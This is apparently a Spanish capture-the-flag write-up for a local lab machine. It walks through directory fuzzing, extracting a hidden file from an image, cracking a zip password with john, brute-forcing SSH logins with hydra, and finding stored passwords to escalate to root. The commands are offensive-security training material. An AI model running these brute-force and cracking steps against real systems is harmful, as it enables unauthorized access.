## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

La web es un índex de apache normal, pruebo fuzzear directorios:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,html,js,pl
```

Encuentro varias cosas, pero interesa este:

```bash
http://172.17.0.2/spongebob/upload/ohnorecallwin.jpg
```

Me descargo la imagen para ver si tiene algo oculto:

```bash
binwalk ohnorecallwin.jpg
stegseek ohnorecallwin.jpg
```

Encuentro la pass : spongebob

```bash
steghide extract -sf ohnorecallwin.jpg
```

Descubrimos un archivo zip con contraseña:

```bash
zip2john seguro.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Contraseña : chocolate

Es una archivo txt que dice:

```bash
aprendemos
```

Suena a contraseña más que a usuario, así que aplico un ataque de fuerza bruta con hydra:

```bash
hydra -L /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -p aprendemos -f ssh://172.17.0.2
```

Usuario: rosa

## Escalada rosa → pedro

Hay un directorio llamado “-”, para acceder se usa el comando:

```bash
cd ~/-
```

Dentro hay muchas carpetas llamadas “buscaelpass”, algunas están vacías y otras tienen texto. Interesa encontrar la que tiene la contraseña. 

Leyendo el archivo “creararch.sh” se puede saber que la contraseña empieza por “x”, así que utilizo el comando find:

```bash
find ./- -type f -exec cat {} \; | grep -v x$
# Info:
pedro:ell0c0
```

## Escalada pedro → juan

En la carpeta de pedro hay:

```bash
/home/pedro/.../.misecreto
# Info:
Consegui el pass de juan y lo tengo escondido en algun lugar del sistema fuera de mi home.
```

Busco archivos en el sistema:

```bash
find / -type f -user pedro 2>/dev/null
# Info:
/var/mail/.pass_juan
# Info:
ZWxwcmVzaW9uZXMK
```

Es la contraseña de juan.

## Escalada juan → root

En el home hay un archivo:

```bash
cat .ordenes_nuevas 
Hola soy tu patron y me canse y me fui a casa te dejo mi pass en un lugar a mano consiguelo y acaba el trabajo.
```

Reviso los archivos del directorio de juan:

```bash
cat .bashrc

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias pass='eljefe'
alias l='ls -CF'
```

“eljefe” es la contraseña de root.

Listo.
